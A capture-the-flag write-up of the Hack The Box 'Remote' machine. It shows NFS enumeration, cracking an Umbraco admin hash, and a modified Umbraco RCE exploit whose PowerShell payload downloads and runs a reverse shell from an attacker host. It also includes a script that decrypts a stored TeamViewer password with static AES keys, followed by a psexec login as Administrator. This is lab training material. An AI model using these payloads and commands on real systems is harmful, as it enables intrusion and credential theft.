---
layout: post
title: "Hack The Box - Remote Writeup"
author: Chr0x6eOs
date: "2020-09-05"
subject: "Remote Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Windows, NFS, Umbraco, RCE, TeamViewer, AES]
lang: "en"
image:
    path: assets/htb/Remote/logo.png
    width: 300
    height: 300
...

# Overview
![Remote](/assets/htb/Remote/remote.png)

[Remote](https://www.hackthebox.eu/home/machines/profile/234) is an easy windows box by [mrb3n](https://www.hackthebox.eu/home/users/profile/2984).

The box starts with HTTP-enumeration, where we can find that the used CMS is `Umbraco`. Without credentials however, we can not access the admin backend.  Enumerating NFS, we can find a backup of the website with the database-file of the CMS. Extracting the password-hash of the admin, we can crack the password and login to the backend of `Umbraco`. Checking out the deployed version, we can see that the installed version is vulnerable to a remote-code-execution vulnerability that we exploit to get a shell and read user.txt.

In order to get root, we enumerate the system and find that TeamViewer (TV) is installed. Researching a bit, we find that the installed version of TV uses static keys for en/decryption of the stored passwords. As these values are publicly known, we can extract the password from the registry and decrypt it. Using the decrypted password we can login as admin and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.045s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
	[...]
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-26T13:47:49
|_  start_date: N/A
```

## Enumeration

We have quite a few ports open. However, FTP (**21**), HTTP (**80**) and NFS (**2049**) seem the most interesting. Nmap tells us that anonymous FTP-access is allowed, so let us start our enumeration here.

### FTP - Port 21

Using our anonymous access, we can access ftp.

```bash
root@darkness:~# ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 221 Goodbye.
```

Seems like there are not files available for us here. Let us continue our enumeration on port 80.

### HTTP - Port 80

Going to http://10.10.10.180, we get this webpage shown.

![Webpage index](/assets/htb/Remote/webpage-index.png)

Looking through the pages, there seem to be nothing interesting. However, scrolling down all the way to the bottom of any page, we get this.

![Footer](/assets/htb/Remote/webpage-footer.png)

Let us google for `Umbraco` real quick.

![Google umbraco](/assets/htb/Remote/google-umbraco.png)

Seems like `Umbraco` is an open source .NET-based CMS. Let us check out the documentation and see how to get to the backend.

#### CMS enumeration

The [documentation](https://our.umbraco.com/documentation/Getting-Started/Backoffice/Login/) states: "`To access the backoffice, you will need to login. You can do this by adding /umbraco to the end of your website URL, e.g. http://mywebsite.com/umbraco`".

![CMS login](/assets/htb/Remote/webpage-cms-login.png)

Going to `/umbraco`, we indeed get redirected to the login prompt. However, because we do not have any credentials yet, (and default credentials did not work) this is not useful for us right now.

Finally, let us check out searchsploit and see if we get any interesting vulnerabilities:

``` bash
root@darkness:~# searchsploit umbraco
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                 | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                          | aspx/webapps/46153.py
```

Seems like there is an authenticated remote code execution exploit for the version 7.12.4. Let us keep this in the back of our minds for possible later exploitation.



### NFS - Port 2049

We can use [showmount](https://linux.die.net/man/8/showmount) to get information from the NFS server.

```bash
root@darkness:~# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

Seems like there is a `/site_backups` export available. Let us mount it!

```bash
root@darkness:~# mkdir /mnt/remote; mount -t nfs 10.10.10.180:/site_backups /mnt/remote; cd /mnt/remote
root@darkness:/mnt/remote# ls -alh
total 123K
drwx------ 2 nobody 4294967294 4.0K Feb 23  2020 .
drwxr-xr-x 4 root   root       4.0K Aug 26 16:08 ..
drwx------ 2 nobody 4294967294   64 Feb 20  2020 App_Browsers
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 App_Data
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 App_Plugins
drwx------ 2 nobody 4294967294   64 Feb 20  2020 aspnet_client
drwx------ 2 nobody 4294967294  48K Feb 20  2020 bin
drwx------ 2 nobody 4294967294 8.0K Feb 20  2020 Config
drwx------ 2 nobody 4294967294   64 Feb 20  2020 css
-rwx------ 1 nobody 4294967294  152 Nov  1  2018 default.aspx
-rwx------ 1 nobody 4294967294   89 Nov  1  2018 Global.asax
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 Media
drwx------ 2 nobody 4294967294   64 Feb 20  2020 scripts
drwx------ 2 nobody 4294967294 8.0K Feb 20  2020 Umbraco
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 Umbraco_Client
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 Views
-rwx------ 1 nobody 4294967294  28K Feb 20  2020 Web.config
```

Let us try and find the configuration files for the CMS.

#### Finding the CMS password

Looking around in the directory I noticed `Umbraco.sdf`, which is the database of the CMS. Let us run strings and grep for `admin` to see if we get any interesting data.

```bash
root@darkness:/mnt/remote/App_Data# strings Umbraco.sdf | grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c
47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
[...]
```

We can manually extract the relevant information out of the output.

```bash
root@darkness:~# cat admin.sha1 
admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa
```

We can now try to crack the hash using john.

```bash
root@darkness:~# john admin.sha1 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (admin@htb.local)
```

We successfully crack the admin hash and now have credentials for Umbraco-login: `admin@htb.local:baconandcheese`.

### Exploiting Umbraco CMS RCE

#### Verifying exploitability of the CMS

Now that we have the required credentials, let us login to the CMS and verify that this version of Umbraco is vulnerable.

![CMS login](/assets/htb/Remote/cms-login.png)

After successfully logging in, we can check out the help tab to display the version information.

![CMS version](/assets/htb/Remote/cms-version.png)

The used CMS version is 7.12.4, which means that this installation is vulnerable to the exploit.

#### Modifying the exploit to get a shell

```bash
root@darkness:~# searchsploit -m aspx/webapps/46153.py
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/46153.py
```

We can now copy the exploit and have the change the following lines:

```python
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet>';

# Authentication information
login = "admin@htb.local";
password="beaconandcheese";
host = "http://10.10.10.180";
```

In order to get the payload working, we have to change the executed program from `calc.exe` to a reverse-shell. To be more precise, we have to change the `string cmd = "";` and `proc.StartInfo.FileName = "calc.exe";`.

The easiest payload is to use PowerShell to download and execute our payload. For this we have to change `string cmd` to: 

```powershell
string cmd = "IEX(New-Object Net.Webclient).DownloadString(\'http://10.10.14.10/rev.ps1\')";
```

And `proc.StartInfo.FileName` to:

```powershell
proc.StartInfo.FileName = "powershell.exe";
```

As the reverse shell I will use the [nishang Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and change the last line of the script to:

```bash
root@darkness:~# cat rev.ps1 | tail -n 1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
```

#### Getting the initial shell

Now that we have prepared the exploit, we can execute it and use python httpserver to host the payload.

```bash
root@darkness# python3 exploit.py
root@darkness# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [26/Aug/2020 16:36:59] "GET /rev.ps1 HTTP/1.1" 200 -
```

```bash
root@darkness:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49699.
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

We get a response on our listener and now have a shell on the server.

The user.txt flag is readable by the user in the `C:\Users\Public\` folder.

```powershell
PS C:\Users\Public> type user.txt
37b20b***************************
```

### Privesc

Now that we got our initial shell, let us enumerate the system to find a way to escalate our privileges to root.

#### Enumeration

Looking around on the system, we can find that TeamViewer is installed.

```powershell
PS C:\Program Files (x86)> dir

    Directory: C:\Program Files (x86)

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/15/2018   3:28 AM                Common Files                                                          
d-----        9/15/2018   5:06 AM                Internet Explorer                                                     
d-----        2/23/2020   2:19 PM                Microsoft SQL Server                                                  
d-----        2/23/2020   2:15 PM                Microsoft.NET                                                         
d-----        2/19/2020   3:11 PM                MSBuild                                                               
d-----        2/19/2020   3:11 PM                Reference Assemblies                                                  
d-----        2/20/2020   2:14 AM                TeamViewer
[...]
```

Let us get the stored password and decrypt it.

#### Manually recovering the stored TV password

According to [this article](https://whynotsecurity.com/blog/teamviewer/), TeamViewer uses static keys for the en/decryption of the stored passwords. Because of this, we can simply read the stored password from the registry and use the known key (and IV) to decrypt it.

Let us first query the registry of TeamViewer:

```powershell
S C:\windows\system32\inetsrv> Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7


StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B9B7D1}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1584564540
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer
PSChildName               : Version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry
```

Next, let us get the password from the `SecurityPasswordAES` property.

```powershell
Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7 | Select-Object -ExpandProperty SecurityPasswordAES
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

We can now create a small python script the get us the decrypted password.

```python
from Crypto.Cipher import AES
from binascii import unhexlify

# Convert encrypted password from decimal to hex
cipher = unhexlify("".join([format(dec,"x") for dec in [255,155,28,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91]]))

# CVE-2019-18988
# KEY and IV from: https://whynotsecurity.com/blog/teamviewer/
key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

# Use AES-128-CBC mode with KEY and IV
aes = AES.new(key, AES.MODE_CBC, iv)
# Decrypt password
password = aes.decrypt(cipher)
# Remove null-bytes
password.strip(b"\x00")

# Convert to ascii
print(f"[+] Decrypted password: {''.join([chr(char) for char in password])}\n")
```

We can now run our program and get the password.

```bash
root@darkness:~# python3 decrypt.py
[+] Decrypted password: !R3m0te!
```

#### Using Metasploit to recover the password

Assuming that we got a meterpreter session, we can also use Metasploit's `teamviewer_password` module to get the password.

```ruby
msf5 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
```

#### Getting a shell as system

Now that we have the password, we can use psexec to get a shell as system.

```bash
root@darkness:~# psexec.py 'Administrator:!R3m0te!@10.10.10.180'
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file YVRjByzu.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service fqMu on 10.10.10.180.....
[*] Starting service fqMu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Now that we have full admin access on the box, we can read root.txt.

```powershell
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
cdae6***************************
```
